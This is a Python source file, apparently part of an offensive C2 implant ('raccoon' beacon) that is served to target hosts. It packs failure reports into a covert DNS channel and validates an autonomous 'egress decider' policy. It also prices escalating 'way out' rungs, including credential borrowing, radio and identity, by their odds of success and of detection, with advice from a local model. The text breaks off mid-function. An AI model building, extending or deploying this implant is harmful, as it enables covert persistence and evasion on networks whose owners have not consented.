_FALLBACK_TRANSPORTS = ("https", "dns", "smb", "quic", "gsocket")

# ── The rescue record, copied from software/c2/dns_rescue.py ──
#
# A copy and not an import, because the generator serves this file to a
# target as source text: an import of `software.c2.dns_rescue` would not
# resolve there, and `relay.py`'s comment on `_PAYLOAD_FIELDS` records the
# same constraint from the listener's side. The copy is the price; a test
# in test_dns_rescue compares the two and fails when they drift.
_RESCUE_VERSION = 2
_RESCUE_MARKER = "r"
_RESCUE_TRANSPORTS = ("https", "dns", "smb", "quic", "gsocket")
# The legs that carry traffic *out*. DNS is not one of them, which is
# the whole reason the rescue exists -- and the reason receiving over
# DNS must not be read as "the way out is open again". `gsocket` is one:
# the forward it opens carries a request and its answer, so a cycle it
# delivered is a cycle whose results can be reported too.
_RESCUE_UPSTREAM = ("https", "smb", "quic", "gsocket")
_RESCUE_CLASSES = {
    "not_attempted": 0,
    "answered": 1,
    "unreachable": 2,
    "refused": 3,
    "timed_out": 4,
    "tls_failed": 5,
    "http_status": 6,
    "auth_required": 7,
    "bad_payload": 8,
    "resolve_failed": 9,
    # The two a leg that needs a helper process has and no socket does:
    # the carrier binary was not on the host, and the carrier was there
    # and did not come up.
    "binary_missing": 10,
    "carrier_failed": 11,
}
_RESCUE_FLAG_PROXY_FOUND = 0x01
_RESCUE_FLAG_DOT1X_SEEN = 0x02
_RESCUE_FLAG_PORTAL_ANSWERED = 0x04
_RESCUE_FLAG_DNS_ANSWERED = 0x08
# version + (class, code-as-two-bytes) per transport + flags. Two bytes for
# the code because 407 -- a proxy demanding authentication -- does not fit
# in one, and nor does any three-digit status above 255.
#
# Five transports, 19 bytes. There is no v1 arm here and there should not
# be: a beacon only ever writes the version it was built with. The
# server-side copy is the one that still has to read the 16-byte records
# implants deployed before the carrier leg keep sending.
_RESCUE_STRUCT = struct.Struct("!BHBHBHBHBHBHB")
# The key the record travels under; see dns_rescue.WRAPPER_KEY for the
# arithmetic that chose it over an "action" value.
_RESCUE_WRAPPER_KEY = "r"



_RESCUE_MAX_PAYLOAD_CHARS = 126


def _rescue_fingerprint(agent_id: str) -> int:
    """Two bytes identifying which beacon is stuck. See dns_rescue."""
    digest = hashlib.sha256((agent_id or "").encode("utf-8", "replace"))
    return int.from_bytes(digest.digest()[:2], "big")


def _rescue_pack(per_transport: dict, flags: int,
                 agent_fingerprint: int = 0) -> bytes:
    """The record, as bytes. Missing transports read as not_attempted.

    The copy of `dns_rescue.pack`. It clamps where that one raises: this
    runs on the failure path of every check-in, and a beacon that crashed
    while recording why it cannot reach anywhere would be the worst trade
    available. The server-side copy validates, which is the right place
    for it -- it is reading something a target sent.
    """
    fields = []
    for name in _RESCUE_TRANSPORTS:
        klass, code = per_transport.get(name, (0, 0))
        fields.append(max(0, min(int(klass), 0xFF)))
        fields.append(max(0, min(int(code), 0xFFFF)))
    return _RESCUE_STRUCT.pack(
        _RESCUE_VERSION, max(0, min(int(agent_fingerprint), 0xFFFF)),
        *(fields + [max(0, min(int(flags), 0xFF))]))


def _rescue_to_labels(b64_ciphertext: str):
    """Two DNS labels carrying `_encrypt`'s output.

    `_encrypt` returns base64; a label needs base32 of the raw bytes. The
    split halves rather than using a constant, because the margin is one
    character wide and a fixed boundary would quietly need a third label
    the moment the record or the wrapper changes.
    """
    raw = base64.b64decode(b64_ciphertext)
    text = base64.b32encode(raw).decode().lower().rstrip("=")
    if not text or len(text) > _RESCUE_MAX_PAYLOAD_CHARS:
        raise ValueError(
            "payload is %d base32 characters; two labels hold %d"
            % (len(text), _RESCUE_MAX_PAYLOAD_CHARS))
    cut = -(-len(text) // 2)
    return text[:cut], text[cut:]

def _rescue_class_of(exc: BaseException) -> int:
    """Which failure class an exception belongs to.

    By type and never by message: a message can carry a hostname or a URL,
    and this value is about to be encrypted into a DNS query name that
    every resolver on the path can see the length of.

    The wrapper is unwrapped first. `_HttpSession` raises `URLError` around
    the real cause, so judging the outer type alone reported a refused
    connection, a TLS failure and a timeout all as "unreachable" -- three
    different things for an operator to do, collapsed into one useless
    word.
    """
    reason = getattr(exc, "reason", None)
    if isinstance(reason, BaseException):
        exc = reason
    if isinstance(exc, ssl.SSLError):
        return _RESCUE_CLASSES["tls_failed"]
    if isinstance(exc, ConnectionRefusedError):
        return _RESCUE_CLASSES["refused"]
    if isinstance(exc, (socket.timeout, TimeoutError)):
        return _RESCUE_CLASSES["timed_out"]
    if isinstance(exc, (ValueError, KeyError, TypeError)):
        # A reply arrived and could not be read: a captive portal's HTML
        # where JSON was expected, or a record that did not decrypt.
        return _RESCUE_CLASSES["bad_payload"]
    return _RESCUE_CLASSES["unreachable"]


# ── The egress decider's policy, as the implant reads it ──
#
# `c2.egress_decider` of configs/raccoon.yaml: what an implant that cannot
# reach its team server may try on its own, in the operator's order, when
# nobody can be reached to be asked. This section **reads** that block and
# **refuses** one that cannot work. Choosing a rule from it is not here:
# the thing that matches these rules against a rescue record, spends the
# budget and acts is `Beacon._egress_act` and the section around it.
#
# Why every refusal below is a log line and a disabled policy, never an
# exception. `tunnel_config_from_yaml` above raises, and can afford to:
# `beacon_config_from_fallback` catches it, leaves the block out and the
# beacon still starts, because "the beacon is the access and the tunnel is
# the convenience". There is nothing below the beacon to catch a policy
# that stopped it, so a refusal here would have cost the access in order to
# protect the policy -- on a dropped device, the worst trade available. A
# block that is absent, incomplete or unusable therefore reads as **off,
# with the reason logged once**, which is how the five transports already
# behave and what the design requires of this one.
#
# Why the refusing happens *here*, when the block is read, rather than when
# a rule would have fired: the moment a rule fires is a stuck cycle on a
# host nobody can reach, which is the worst possible moment to discover
# that a policy is unusable. `tunnel_config_from_yaml` made the same call
# about a `psk` in the file -- refused whether the tunnel is enabled or not
# -- and the rules here are read whether the decider is enabled or not for
# the same reason: a trap in a disabled block is a trap waiting for the day
# somebody enables it, and the shipped block *is* disabled.
#
# One call, one log line: the first problem found is the one reported, and
# a stuck implant is not the place to enumerate an operator's typos.

# The verbs a rule may name, which is the gate the operator cannot widen:
# configuration selects from this tuple and orders it. `_exec_egress`
# dispatches exactly these sub-verbs; a test holds the two together,
# because a verb here that the beacon does not have would be a rule that
# can never fire, and a sub-verb there that is missing here is one the
# decider cannot reach.
#
# **In cost order, which is the design's backbone.** The first three are
# rung 2 and are what this file has always had; the last four arrived with
# the way out. Rung 1 -- observe -- is evidence only and has no verb at
# all: what it produces is the target a louder rung aims at.
#
#   rung 2, borrow      proxy, rediscover, gsocket, credential, portal
#   rung 3, own radio   radio
#   rung 4, identity    identity
#
# Naming a verb is not reaching it: `_WAY_OUT_RUNG_OF` below prices each
# one, and the loud rungs are reachable only through that arithmetic.
EGRESS_VERBS = ("proxy", "rediscover", "gsocket", "credential", "portal",
                "radio", "identity")

# The flag names a `when` may say, and the bit each one is -- a copy of
# dns_rescue's FLAG_*, like `_RESCUE_CLASSES` above and for the same reason.
# The bit travels with the name so that whatever matches these rules next
# has one mapping to read rather than a second copy of these names.
#
# All four, in the record's own bit order. Two of them used to be dead; see
# `_EGRESS_DEAD_FLAGS` below.
_EGRESS_FLAG_BITS = {
    "proxy_found": _RESCUE_FLAG_PROXY_FOUND,
    "dot1x_seen": _RESCUE_FLAG_DOT1X_SEEN,
    "portal_answered": _RESCUE_FLAG_PORTAL_ANSWERED,
    "dns_answered": _RESCUE_FLAG_DNS_ANSWERED,
}

# Nothing. It used to hold `dot1x_seen` and `portal_answered`, which were
# in the record's format and rendered by the team server and which nothing
# in this implant set: no 802.1X sensing and no captive-portal detection
# existed here, so a rule naming one could never match, and a rule that can
# never fire is a trap in the one file nobody can debug remotely. The
# previous design called making them live *"the one work that would make
# this decider much smarter"*, and this is that work: the scout watches the
# tapped port for EAPOL and for a captive portal the host got *past*, and
# `Beacon._way_out_absorb_flags` ORs what it found into the record.
#
# Kept as an empty mapping rather than deleted, because `_egress_check_flag`
# reads it and the day a fifth flag is declared in the record and set by
# nothing, it belongs here with its reason -- the refusal and the message
# are worth more than the three lines they cost.
_EGRESS_DEAD_FLAGS = {}     # type: Dict[str, int]

# What the block may contain, and what a rule may contain. Anything else is
# refused by name: `budgte: 3` would otherwise leave the budget at its
# default with nothing saying so, on a host whose operator cannot read the
# file and the log together.
_EGRESS_BLOCK_KEYS = ("enabled", "budget", "rules")
_EGRESS_RULE_KEYS = ("when", "try")

# The two `when` keys that are not a transport name. `any` is "any
# transport carrying one of these classes"; `flags` is the record's flag
# byte. Both are the design's spelling.
_EGRESS_WHEN_ANY = "any"
_EGRESS_WHEN_FLAGS = "flags"

# Everything a `when` may name. The transports are `_RESCUE_TRANSPORTS` and
# not `_FALLBACK_TRANSPORTS`, even though the two hold the same five names:
# what a rule reads is the rescue record's evidence, so the record's
# vocabulary is the one that belongs here. A test holds the two tuples
# equal, so a leg added to one and not the other fails loudly instead of
# becoming a transport no rule can name.
_EGRESS_WHEN_KEYS = _RESCUE_TRANSPORTS + (_EGRESS_WHEN_ANY,
                                          _EGRESS_WHEN_FLAGS)

# Attempts per stuck window when the block names no number. Three, because
# there are three verbs, so the default is one attempt each. Defaulted
# rather than refused because a forgotten line should not turn a policy
# into a dead one -- but never *unbounded*, which is what an absent budget
# would mean if this were zero or None.
#
# There is deliberately no upper bound. One attempt per cycle is the
# design's rule, so a large number is bounded in time by the beacon
# interval anyway, and a cap would be a number in this file with no reason
# behind its particular value that an operator with a reason could not
# pass. The gate -- the thing configuration may not widen -- is about
# *which* verbs, not how many times.
_EGRESS_DEFAULT_BUDGET = 3


def _egress_disabled() -> dict:
    """The shape a refusal returns: off, nothing to choose, nothing to spend.

    A fresh dict each time rather than a module-level constant, because a
    shared one handed to a caller is a mapping somebody can mutate into
    every later reader's default.

    `budget` is 0 and `rules` is empty on purpose. A refused policy that
    carried the operator's rules and number would leave a later reader
    which forgot to check `enabled` with something to choose from and
    something to spend; this way the refusal still holds. Two lines of
    belt and braces, in the one file nobody can debug remotely.
    """
    return {"enabled": False, "budget": 0, "rules": []}


def read_egress_policy(block) -> dict:
    """Read `c2.egress_decider`, or say once why it cannot be used.

    Returns `{"enabled": bool, "budget": int, "rules": [...]}`, always all
    three keys, where each rule is `{"when": {...}, "try": "<verb>"}` with
    every `when` value normalised to a list of names. Never raises: see the
    section comment above for why a refusal on an implant is a log line.

    **`budget` and `rules` mean something only when `enabled` is true.** A
    refusal returns neither -- `_egress_disabled` says why -- but a block
    that reads cleanly and says `enabled: false` keeps both, and the
    shipped one is exactly that: a disabled decider carrying the
    operator's rules so that switching it on is one word. Those rules are
    a draft and not permission, so a consumer asks `enabled` first.
    `Beacon.__init__` is the one consumer and does.

    `block` is whatever the YAML held, including None for a deployment that
    predates this feature -- which reads as off and says nothing, because
    there is nothing for an operator to fix and nothing to tell them.

    A `when` may carry several keys at once, and they are read as *all of
    them have to hold*. That was left to the builder, and it is recorded
    here rather than in whatever matches these rules next: `{https: [...],
    flags: [...]}` is the first thing an operator writes, refusing it would
    be pedantry, and the other reading -- any key is enough -- would let a
    rule fire on evidence the operator did not describe. Adding a key can
    only narrow, which is the reading that cannot surprise somebody who is
    not there to be surprised.
    """
    if block is None:
        return _egress_disabled()
    try:
        return _egress_policy(block)
    except ValueError as exc:
        # Once, where the config is built, and then the policy is off.
        # Nothing rereads the block, so this is one line per start and not
        # one per stuck cycle -- the arrangement the gsocket leg's latched
        # reason already has.
        logger.warning("The egress decider is off: %s", exc)
        return _egress_disabled()


def _egress_policy(block) -> dict:
    """`read_egress_policy`'s reading, raising a ValueError on anything bad.

    Split out so that each refusal is one `raise` naming its own offending
    value, instead of a problem string threaded through twenty returns.
    The caller is the one that turns a raise into a log line, exactly as
    `beacon_config_from_fallback` does for the tunnel.
    """
    if not isinstance(block, dict):
        raise ValueError(
            "c2.egress_decider is %r, which is not a mapping of %s"
            % (block, ", ".join(_EGRESS_BLOCK_KEYS)))
    unknown = [key for key in block if key not in _EGRESS_BLOCK_KEYS]
    if unknown:
        raise ValueError(
            "c2.egress_decider has %s, which is not a setting it has: it "
            "takes %s"
            % (", ".join(repr(key) for key in unknown),
               ", ".join(_EGRESS_BLOCK_KEYS)))

    # Read by value and never as `bool(...)`, for the reason the gsocket
    # leg records at its own `enabled`: `bool("false")` is True and YAML
    # does not unquote a quoted scalar, so `enabled: "false"` would switch
    # on an autonomous decider out of a file that says the opposite. Here
    # it is refused rather than quietly read as off, because this setting
    # is the whole difference between an implant that acts on its own and
    # one that does not.
    raw_enabled = block.get("enabled", False)
    if not isinstance(raw_enabled, bool):
        raise ValueError(
            "c2.egress_decider.enabled is %r, and only the boolean true "
            "enables it -- an unquoted true or false is what this setting "
            "takes" % (raw_enabled,))

    budget = _egress_budget(block.get("budget", _EGRESS_DEFAULT_BUDGET))
    rules = _egress_rules(block.get("rules"))
    if raw_enabled and not rules:
        raise ValueError(
            "c2.egress_decider is enabled and its rules are %r, so it could "
            "only ever decide nothing: a policy that cannot fire is refused "
            "rather than left looking switched on. Say enabled: false if "
            "that is what is meant" % (block.get("rules"),))
    return {"enabled": raw_enabled, "budget": budget, "rules": rules}


def _egress_budget(raw) -> int:
    """How many attempts a stuck window may spend."""
    # `isinstance(True, int)` is True in Python, so a stray YAML boolean
    # would otherwise read as one attempt out of a file that names no
    # number at all. Refused rather than taken, because a budget is the
    # bound on an implant acting with nobody watching.
    if isinstance(raw, bool) or not isinstance(raw, int):
        raise ValueError(
            "c2.egress_decider.budget is %r, which is not a whole number of "
            "attempts" % (raw,))
    if raw < 1:
        raise ValueError(
            "c2.egress_decider.budget is %r, and a policy with no attempts "
            "to spend decides nothing while the file says it is on: say "
            "enabled: false if that is what is meant" % (raw,))
    return raw


def _egress_rules(raw) -> List[dict]:
    """The rules, in the operator's order, each one read or the lot refused.

    The order is the policy -- the first matching rule is the attempt --
    so nothing here sorts or de-duplicates: that would be a different
    policy from the one in the file.

    Absent is an empty list and not an error. Whether that is usable
    depends on `enabled`, which is the caller's to judge.
    """
    if raw is None:
        return []
    if not isinstance(raw, list):
        raise ValueError("c2.egress_decider.rules is %r, which is not a "
                         "list of rules" % (raw,))
    return [_egress_rule(item, index)
            for index, item in enumerate(raw, 1)]


def _egress_rule(item, index: int) -> dict:
    """One rule: a condition and the verb to try when it holds.

    `index` is the rule's position as the operator counts it, from 1. Every
    refusal carries it: a file with three rules and one of them wrong needs
    to say which, since whoever has to fix it cannot read this log and the
    file at the same time.
    """
    where = "c2.egress_decider.rules[%d]" % index
    if not isinstance(item, dict):
        raise ValueError("%s is %r, which is not a mapping of %s"
                         % (where, item, ", ".join(_EGRESS_RULE_KEYS)))
    unknown = [key for key in item if key not in _EGRESS_RULE_KEYS]
    if unknown:
        raise ValueError(
            "%s has %s, which is not part of a rule: a rule is a 'when' and "
            "a 'try'"
            % (where, ", ".join(repr(key) for key in unknown)))

    verb = item.get("try")
    if verb is None:
        raise ValueError("%s names no 'try', so nothing would happen if it "
                         "matched" % where)
    if verb not in EGRESS_VERBS:
        # The allowed set is a list and not a judgement: a policy may
        # choose from it and order it, and may not add to it. `sleep` is
        # the refusal that matters -- a verb the beacon really has, and the
        # one the team server reaches for on a stuck beacon, where there is
        # an operator to be asked about slowing an implant's check-ins.
        raise ValueError(
            "%s.try is %r, which is not one of the three verbs a policy may "
            "name: %s. The allowed set is fixed in the implant -- a policy "
            "chooses from it and orders it, and cannot add to it"
            % (where, verb, ", ".join(EGRESS_VERBS)))
    return {"when": _egress_when(item.get("when"), where), "try": verb}


def _egress_when(raw, where: str) -> Dict[str, List[str]]:
    """A rule's condition: transports, `any` and `flags`, each with names.

    Every value is normalised to a list, so a single name may be written
    without one -- `when: {https: refused}` is what a hand writes, and the
    one-element list is noise. What reads these next sees one shape.
    """
    if raw is None:
        raise ValueError(
            "%s names no 'when', and a rule with no condition would fire on "
            "every stuck cycle: an unconditional autonomous attempt is "
            "spelled out in this file or not made" % where)
    if not isinstance(raw, dict):
        raise ValueError("%s.when is %r, which is not a mapping" % (where, raw))
    if not raw:
        raise ValueError(
            "%s.when is empty, and a rule with no condition would fire on "
            "every stuck cycle: name a transport (%s), %r or %r"
            % (where, ", ".join(_RESCUE_TRANSPORTS), _EGRESS_WHEN_ANY,
               _EGRESS_WHEN_FLAGS))

    when = {}
    for key, value in raw.items():
        # The type first, so an unhashable key out of a YAML complex
        # mapping is named rather than raising a TypeError from `in`.
        if not isinstance(key, str) or key not in _EGRESS_WHEN_KEYS:
            raise ValueError(
                "%s.when names %r, which is neither a transport (%s) nor %r "
                "nor %r"
                % (where, key, ", ".join(_RESCUE_TRANSPORTS),
                   _EGRESS_WHEN_ANY, _EGRESS_WHEN_FLAGS))
        field = "%s.when.%s" % (where, key)
        names = _egress_names(value, field)
        for name in names:
            if key == _EGRESS_WHEN_FLAGS:
                _egress_check_flag(name, field)
            else:
                _egress_check_class(name, field)
        when[key] = names
    return when


def _egress_names(value, where: str) -> List[str]:
    """One name or a list of them, as a list. Empty is refused."""
    names = [value] if isinstance(value, str) else value
    if not isinstance(names, list) or not names:
        raise ValueError(
            "%s is %r, so it could never match: it takes one name or a list "
            "of them" % (where, value))
    for name in names:
        if not isinstance(name, str):
            raise ValueError("%s names %r, which is not a name" % (where, name))
    return list(names)


def _egress_check_class(name: str, where: str) -> None:
    """Refuse a class name the rescue record does not have.

    Class names rather than numbers, because the operator reads
    `auth_required` and not `7` -- which is also what makes a typo the
    likely failure here, and why the message carries the classes that do
    exist. The names are `_RESCUE_CLASSES`, the copy of `dns_rescue.CLASSES`
    this file already carries for the record itself, so there is one
    vocabulary and not two.

    A class only one leg ever records -- `answered` is DNS's, and
    `binary_missing` is the carrier's -- is *not* refused for another
    transport. It is a true statement about that leg that simply does not
    happen to arise, which is a different thing from the two dead flag
    names: those cannot be set by any leg at all, ever.
    """
    if name not in _RESCUE_CLASSES:
        raise ValueError(
            "%s names %r, which is not one of the rescue classes: %s"
            % (where, name,
               ", ".join(sorted(_RESCUE_CLASSES, key=_RESCUE_CLASSES.get))))


def _egress_check_flag(name: str, where: str) -> None:
    """Refuse a flag name the beacon never sets, and say why.

    A dead name gets its own message. "not a flag" would send an operator
    looking for a typo in a name they read in the panel, so the message
    says what nothing on this implant does. Both messages name the live
    flags in the record's own bit order rather than alphabetically, which
    is the order the operator reads them in `dns_rescue.py`.

    `_EGRESS_DEAD_FLAGS` is empty today -- the scout made the last two
    live -- so the first arm is unreachable until the record declares a
    fifth flag nothing sets. It is kept because that day the refusal and
    its reason are worth more than the lines they cost.
    """
    if name in _EGRESS_DEAD_FLAGS:
        live = [flag for flag in _EGRESS_FLAG_BITS
                if flag not in _EGRESS_DEAD_FLAGS]
        raise ValueError(
            "%s names %r, which nothing in this implant ever sets: it is in "
            "the rescue record's format and the team server renders it, but "
            "nothing here senses it, so only %s are ever set. A rule that "
            "could never match is refused rather than carried"
            % (where, name, " and ".join(live)))
    if name not in _EGRESS_FLAG_BITS:
        raise ValueError(
            "%s names %r, which is not a flag the rescue record carries: it "
            "is %s"
            % (where, name, " or ".join(_EGRESS_FLAG_BITS)))


def _radio_lease(path: str) -> Tuple[str, int, str]:
    """`(address, prefix, router)` from a dhclient lease file.

    The lease is read rather than dhclient's script being allowed to act,
    because that script installs a **default route** -- the one thing the
    radio rung may never do. So DHCP runs with `-sf /bin/true` and this
    reads what it wrote.

    An unreadable or incomplete lease answers with empty strings, which the
    rung treats as a failure and rolls back: a radio with an address and no
    gateway is a change the operator cannot see.
    """
    try:
        with open(path, "r") as handle:
            text = handle.read()
    except OSError:
        return "", 24, ""
    address = router = ""
    prefix = 24
    for line in text.splitlines():
        line = line.strip().rstrip(";")
        if line.startswith("fixed-address "):
            address = line.split(None, 1)[1].strip()
        elif line.startswith("option routers "):
            router = line.split(None, 2)[2].strip().split(",")[0].strip()
        elif line.startswith("option subnet-mask "):
            mask = line.split(None, 2)[2].strip()
            try:
                bits = sum(bin(int(part)).count("1")
                           for part in mask.split("."))
            except ValueError:
                continue
            if 0 < bits <= 32:
                prefix = bits
    return address, prefix, router


# ── The way out: the files the scout and the beacon meet over ──
#
# `c2.way_out` of configs/raccoon.yaml. The scout
# (`software/scout/`) captures a narrow slice of the tapped port, writes
# what it found, and -- in its model stage -- one recommendation; this file
# writes one state file saying a stuck window is open and reads the
# scout's document when it is fresh. The two halves cannot import each
# other: the scout needs scapy and this file is served to a target as
# source text, so the five names and the two versions below are **copies**
# of `software/scout/handoff.py`'s, exactly as `_RESCUE_*` above are copies
# of `dns_rescue.py`'s, and `test_way_out_handoff.py` compares them.
#
# Drop-box only, like the decider: a generated build carries no
# `configs/raccoon.yaml`, so there is no block to read and everything here
# is off.
_WAY_OUT_STATE_NAME = "way_out_state.json"
_WAY_OUT_DOCUMENT_NAME = "way_out_scout.json"
_WAY_OUT_TRAIL_NAME = "way_out_trail.jsonl"
_WAY_OUT_BORROW_NAME = "way_out_borrow.json"
_WAY_OUT_IDENTITY_NAME = "way_out_identity.json"
# dhclient's lease, which rung 3 reads instead of letting dhclient's own
# script act on it -- that script installs a default route, the one thing
# the rung may never do. **Kept** after a successful attempt, because it
# is the only record of which address the rung's source rule was installed
# for that survives a restart of this process: see
# `Beacon._radio_lease_address`.
_WAY_OUT_RADIO_LEASE_NAME = "way_out_radio.lease"
_WAY_OUT_STATE_VERSION = 1
_WAY_OUT_DOCUMENT_VERSION = 1
_WAY_OUT_BORROW_VERSION = 1

# The two flags the *tap* can set, and only these two are absorbed from a
# document. `proxy_found` and `dns_answered` are findings of a leg -- a
# proxy that refused this implant, a resolver that answered it -- so taking
# either from the scout would let it claim something no leg had tried.
_WAY_OUT_TAP_FLAGS = {
    "dot1x_seen": _RESCUE_FLAG_DOT1X_SEEN,
    "portal_answered": _RESCUE_FLAG_PORTAL_ANSWERED,
}

# ── The rungs' prices, copied from software/agent/safety.py's WAY_OUT_TABLE ──
#
# `(points, p_success, p_detect)` per row, and a copy for the reason the
# rescue record is one: this file is served to a target as source text, so
# `from software.agent import safety` would not resolve there.
# `test_way_out_gate.py` compares the two and fails when they drift.
#
# Not in `gate.Gate` either, and not only because of the import: that class
# needs a SQLite connection, a `run_id`, an approvals table and an event
# loop (`gate.py:258-307`), none of which exists on an implant with no
# channel. What is reproduced here is the inequality and nothing else.
_WAY_OUT_ROWS = {
    "way_out_borrow": (20, 0.5, 0.35),
    "way_out_radio": (20, 0.4, 0.5),
    "way_out_identity": (20, 0.5, 0.8),
}

# Which row prices which rung. Rung 1 is evidence only, so it has no row:
# three rows, four rungs.
_WAY_OUT_ROW_OF = {
    2: "way_out_borrow",
    3: "way_out_radio",
    4: "way_out_identity",
}

# Every verb's rung. A verb with no entry here could not be priced, so it
# would reach the implant's own decision ungated -- which is the hole the
# first draft of this design left and the reason both the policy path and
# the model path go through `_way_out_allows`.
_WAY_OUT_RUNG_OF = {
    "proxy": 2,
    "rediscover": 2,
    "gsocket": 2,
    "credential": 2,
    "portal": 2,
    "radio": 3,
    "identity": 4,
}

# The rungs the three verbs this file has always had live on. With
# `c2.way_out` off, those verbs behave exactly as they do today -- no
# arithmetic, no new refusal -- and anything above this rung is refused
# with a reason. That is the distribution rule: the ladder arrives with
# the scout, and a build without one keeps today's behaviour.
_WAY_OUT_UNGATED_RUNG = 2

# A model's probability estimate is advisory. The span is
# `safety.clamp_llm_adjustment`'s, copied with the floor and ceiling that
# keep a clamped value a probability.
_WAY_OUT_CLAMP_SPAN = 0.2
_WAY_OUT_P_MIN = 0.01
_WAY_OUT_P_MAX = 0.99

_WAY_OUT_BLOCK_KEYS = ("enabled", "state_dir", "document_max_age_seconds",
                       "points_per_hour", "points_max", "risk_coefficient",
                       "ev_threshold", "dot1x_detect", "portal_detect",
                       "model")
_WAY_OUT_MODEL_KEYS = ("enabled", "endpoint", "name", "timeout_seconds")

# The defaults, and where each number comes from.
#
# `document_max_age_seconds` is the fresh-or-ignore window: a document
# older than this is ignored, so a dead scout degrades to the five lines
# of evidence the decider already had rather than to a stale decision.
# 900 is three times the shipped beacon interval's publishing cadence, so
# a scout that missed one publish is still believed and one that died is
# not.
#
# `points_per_hour` and `points_max` are the curve. `points` is the value
# of what the action unlocks (`safety.py:420-428`), and the value of a
# restored channel is not constant: a channel back in the first hour is
# worth a check-in, and one back after a week is the difference between an
# operation and a dead device in a rack. That curve is the whole mechanism
# behind the human's stated appetite -- dark is useless -- expressed as a
# number rather than as a rule that fires.
#
# `risk_coefficient` and `ev_threshold` are the shipped agent profile's
# (`config.py:652-659`), copied rather than imported: a drop-box has no
# campaign configuration and no `RISK_PROFILES`.
#
# `dot1x_detect` and `portal_detect` are the two evidence modifiers. A
# port that authenticates is a port somebody configured and therefore
# watches, so `dot1x_seen` raises the identity rung's detection
# probability; a network that redirects every browser sees credential
# prompts answered all day, so `portal_answered` lowers the borrow rung's.
_WAY_OUT_DEFAULTS = {
    "state_dir": "",
    "document_max_age_seconds": 900,
    "points_per_hour": 5,
    "points_max": 100,
    "risk_coefficient": 33,
    "ev_threshold": 0,
    "dot1x_detect": 0.15,
    "portal_detect": -0.10,
}
_WAY_OUT_MODEL_DEFAULTS = {
    "enabled": False,
    # Loopback, and the reader refuses anything else by name. The model
    # exists for this implant's own decision; a listener reachable from the
    # target segment would hand it to anyone on the network the implant is
    # hiding in.
    "endpoint": "http://127.0.0.1:11434",
    "name": "",
    # The agent's own page allows a local link 300 seconds against 120 for
    # a hosted one and says how much of that a Pi uses "has not been
    # measured for this page" (`docs/AGENT.md:491-493`). 120 here, because
    # nothing waits on it: the beacon reads a file.
    "timeout_seconds": 120,
}

# The whole-number settings, each with the smallest value that still means
# something. `ev_threshold` is not here: zero is the shipped threshold and
# a negative one is a legitimate "allow a little below break-even".
# The whole-number settings, each with the smallest value that still
# leaves the feature meaning something. `ev_threshold` is separate below.
#
# These were 1, 0, 1 and 1, and every one of those is legal and breaks the
# feature in a way nothing says out loud. `points_per_hour: 0` is the
# natural way to write "no time-based escalation" and it closes the gate
# for ever -- including for the three verbs that worked before the way out
# existed. `points_max: 1` and `risk_coefficient: 1` do the opposite:
# `risk_coefficient: 1` opens the irreversible rung on the first cycle the
# decider may act, which is precisely the loud rescue `_way_out_points`'
# own docstring says the operator must not be able to buy with a number in
# a file. And `document_max_age_seconds: 1` leaves every document stale
# before it is read, so the rungs that need one are dead while the scout
# captures nearly continuously.
_WAY_OUT_WHOLE = {
    # Two capture slices, so a document can be written before it expires.
    "document_max_age_seconds": 30,
    "points_per_hour": 1,
    # Above the rows' own `points`, or the curve cannot move at all.
    "points_max": 21,
    "risk_coefficient": 10,
}
# The two probability modifiers, which are fractions and may be negative.
_WAY_OUT_FRACTIONS = ("dot1x_detect", "portal_detect")


def _way_out_disabled() -> dict:
    """The shape a refusal returns: off, with nothing to read or write.

    `state_dir` is emptied as well as `enabled` cleared, for the reason
    `_egress_disabled` zeroes the budget: a refused block that kept the
    operator's directory would leave a later reader which forgot to check
    `enabled` with a path to write an artefact to.
    """
    block = dict(_WAY_OUT_DEFAULTS)
    block["enabled"] = False
    block["state_dir"] = ""
    block["model"] = dict(_WAY_OUT_MODEL_DEFAULTS)
    return block


def read_way_out_policy(block) -> dict:
    """Read `c2.way_out`, or say once why it cannot be used.

    Never raises, for the reason `read_egress_policy` gives in full: there
    is nothing below the beacon to catch a block that stopped it, so a
    refusal here would have cost the access in order to protect a setting.
    A block that is absent, incomplete or unusable reads as **off, with the
    reason logged once**.

    Validated whether it is enabled or not, and the shipped one is
    disabled: a trap in a disabled block is a trap waiting for the day
    somebody enables it.
    """
    if block is None:
        return _way_out_disabled()
    try:
        return _way_out_policy(block)
    except ValueError as exc:
        logger.warning("The way out is off: %s", exc)
        return _way_out_disabled()


def _way_out_policy(block) -> dict:
    """`read_way_out_policy`'s reading, raising on anything bad."""
    if not isinstance(block, dict):
        raise ValueError(
            "c2.way_out is %r, which is not a mapping of %s"
            % (block, ", ".join(_WAY_OUT_BLOCK_KEYS)))
    unknown = [key for key in block if key not in _WAY_OUT_BLOCK_KEYS]
    if unknown:
        raise ValueError(
            "c2.way_out has %s, which is not a setting it has: it takes %s"
            % (", ".join(repr(key) for key in unknown),
               ", ".join(_WAY_OUT_BLOCK_KEYS)))

    # Read by value and never as `bool(...)`: `bool("false")` is True and
    # YAML does not unquote a quoted scalar, so `enabled: "false"` would
    # switch on a second capture reader and a cross-process trigger out of
    # a file that says the opposite.
    raw_enabled = block.get("enabled", False)
    if not isinstance(raw_enabled, bool):
        raise ValueError(
            "c2.way_out.enabled is %r, and only the boolean true enables it "
            "-- an unquoted true or false is what this setting takes"
            % (raw_enabled,))

    policy = dict(_WAY_OUT_DEFAULTS)
    policy["enabled"] = raw_enabled
    policy["state_dir"] = _way_out_state_dir(block.get("state_dir"),
                                             raw_enabled)
    for key, floor in _WAY_OUT_WHOLE.items():
        policy[key] = _way_out_whole(key, block.get(key, policy[key]), floor)
    policy["ev_threshold"] = _way_out_threshold(
        block.get("ev_threshold", policy["ev_threshold"]),
        policy["points_max"])
    for key in _WAY_OUT_FRACTIONS:
        policy[key] = _way_out_fraction(key, block.get(key, policy[key]))
    policy["model"] = _way_out_model(block.get("model"))
    return policy


def _way_out_state_dir(raw, enabled: bool) -> str:
    """Where the two files live, which may not be under `/tmp`.

    Refused rather than defaulted, because the symptom of getting it wrong
    is silence: `raccoon-beacon.service` and `raccoon-implant.service` both
    set `PrivateTmp=true`, so each process gets its own private `/tmp` and
    the handoff would simply never happen -- on the one host nobody can
    debug remotely.
    """
    if raw is None and not enabled:
        return ""
    if not isinstance(raw, str) or not raw.strip():
        raise ValueError(
            "c2.way_out.state_dir is %r, and the beacon and the scout meet "
            "over files in it, so it has to name a directory. It may not be "
            "under /tmp: both units set PrivateTmp=true, so each process "
            "would get its own and the handoff would silently never happen"
            % (raw,))
    path = raw.strip()
    if path == "/tmp" or path.startswith("/tmp/"):
